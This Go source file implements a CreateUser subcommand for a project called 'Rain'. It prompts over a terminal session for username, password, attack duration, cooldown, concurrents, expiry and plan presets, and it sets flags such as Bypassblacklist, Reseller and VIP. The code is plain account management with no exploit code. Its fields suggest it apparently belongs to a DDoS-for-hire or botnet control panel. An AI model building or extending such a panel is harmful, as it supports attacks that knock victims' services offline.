package subcommands

import (
	"log"
	"strconv"
	"time"

	Database "Rain/core/database"
	ParseJson "Rain/core/functions/json"
	ParsedJson "Rain/core/functions/json/meta"
	Util "Rain/core/functions/util"
	Sessions "Rain/core/masters/sessions"

	"golang.org/x/term"
)

func CreateUser(session *Sessions.Session, cmd []string) error {
	if len(cmd) > 2 {
		Pres := GetPremade(cmd[2])
		if Pres == nil {
			session.Channel.Write([]byte("\x1b[0m\"\x1b[38;5;11m" + cmd[2] + "\x1b[0m\" is not a vaild plan preset\r\n"))
			return nil
		}

		User := term.NewTerminal(session.Channel, "\x1b[0mUsername> ")
		Username, error := User.ReadLine()
		if error != nil {
			session.Channel.Write([]byte("\r\n"))
			return nil
		}

		Pass := term.NewTerminal(session.Channel, "\x1b[0mPassword> ")
		Password, error := Pass.ReadLine()
		if error != nil {
			session.Channel.Write([]byte("\r\n"))
			return nil
		}

		Pwd := Util.PasswordHash(Password)

		var NewUser = Database.User_Struct{
			Username: Username,
			Password: Pwd,

			Admin:           Pres.Admin,
			Powersaving:     Pres.PowerSaving,
			Bypassblacklist: Pres.Bypassblacklist,
			Reseller:        Pres.Reseller,
			Newuser:         true,
			Banned:          Pres.Banned,
			VIP:             Pres.VIP,
			Raw:             Pres.Raw,
			Holder:          Pres.Holder,
			MaxSessions:     Pres.MaxSessions,
			MFA:             false,
			MFAToken:        "",

			MaxTime:     Pres.MaxTime,
			Cooldown:    Pres.Cooldown,
			Concurrents: Pres.Concurrents,
			Expiry:      time.Now().Add((time.Hour * 24) * time.Duration(Pres.DaysActive)).Unix(),
		}

		error = Database.CreateNewUser(&NewUser)
		if error != nil {
			session.Channel.Write([]byte("\x1b[0mFailed to create new user due to a unknown error\r\n"))
			log.Println("ERROR:", error)
			return nil
		} else {
			session.Channel.Write([]byte("\x1b[32mNew user has been created correctly.\r\n"))
			return nil
		}
	}

	User := term.NewTerminal(session.Channel, "\x1b[38;5;255mUsername>\x1b[38;5;227m ")
	Username, error := User.ReadLine()
	if error != nil {
		session.Channel.Write([]byte("\r\n"))
		return nil
	}

	Pass := term.NewTerminal(session.Channel, "\x1b[38;5;255mPassword>\x1b[38;5;227m ")
	Password, error := Pass.ReadLine()
	if error != nil {
		session.Channel.Write([]byte("\r\n"))
		return nil
	}

	MaxTM := term.NewTerminal(session.Channel, "\x1b[38;5;255mDuration>\x1b[38;5;227m ")
	MaxTime, error := MaxTM.ReadLine()
	if error != nil {
		session.Channel.Write([]byte("\r\n"))
		return nil
	}

	CooldownB := term.NewTerminal(session.Channel, "\x1b[38;5;255mCooldown>\x1b[38;5;227m ")
	Cooldw, error := CooldownB.ReadLine()
	if error != nil {
		session.Channel.Write([]byte("\r\n"))
		return nil
	}

	connsB := term.NewTerminal(session.Channel, "\x1b[38;5;255mConcurrents>\x1b[38;5;227m ")
	conns, error := connsB.ReadLine()
	if error != nil {
		session.Channel.Write([]byte("lol\r\n"))
		return nil
	}

	DaysB := term.NewTerminal(session.Channel, "\x1b[38;5;255mExpiry in days>\x1b[38;5;227m ")
	Days, error := DaysB.ReadLine()
	if error != nil {
		session.Channel.Write([]byte("\r\n"))
		return nil
	}

	MaxSessionsB := term.NewTerminal(session.Channel, "\x1b[38;5;255mMax Sessions>\x1b[38;5;227m ")
	MaxSess, error := MaxSessionsB.ReadLine()
	if error != nil {
		session.Channel.Write([]byte("\r\n"))
		return nil
	}

	Maxtime, error := strconv.Atoi(MaxTime)
	if error != nil {
		session.Channel.Write([]byte("MaxTime option must be a integer\r\n"))
		return nil
	}

	Cooldown, error := strconv.Atoi(Cooldw)
	if error != nil {
		session.Channel.Write([]byte("Cooldown option must be a integer\r\n"))
		return nil
	}

	Concurrents, error := strconv.Atoi(conns)
	if error != nil {
		session.Channel.Write([]byte("Concurrents option must be a integer\r\n"))
		return nil
	}

	DaysActive, error := strconv.Atoi(Days)
	if error != nil {
		session.Channel.Write([]byte("Days active option must be a integer\r\n"))
		return nil
	}

	MaxSessions, error := strconv.Atoi(MaxSess)
	if error != nil {
		session.Channel.Write([]byte("Max Sessions option must be a integer\r\n"))
		return nil
	}

	Pwd := Util.PasswordHash(Password)

	var NewUser = Database.User_Struct{
		Username: Username,
		Password: Pwd,

		Admin:           false,
		Powersaving:     true,
		Bypassblacklist: false,
		Reseller:        false,
		Newuser:         true,
		Banned:          false,
		VIP:             false,
		Raw:             false,
		Holder:          false,
		MFA:             false,
		MFAToken:        "",

		MaxSessions: MaxSessions,
		MaxTime:     Maxtime,
		Cooldown:    Cooldown,
		Concurrents: Concurrents,
		Expiry:      time.Now().Add((time.Hour * 24) * time.Duration(DaysActive)).Unix(),
	}

	error = Database.CreateNewUser(&NewUser)
	if error != nil {
		session.Channel.Write([]byte("\x1b[0mFailed to create new user due to a unknown error\r\n"))
		log.Println("ERROR:", error)
		return nil
	} else {
		session.Channel.Write([]byte("\x1b[38;5;227mNew user has been created correctly\r\n"))
		return nil
	}
}

func GetPremade(name string) *ParsedJson.Plans {
	for I := 0; I < len(ParseJson.PlansParse.Plan); I++ {
		if ParseJson.PlansParse.Plan[I].Name == name {
			return &ParseJson.PlansParse.Plan[I]
		}
	}

	return nil
}
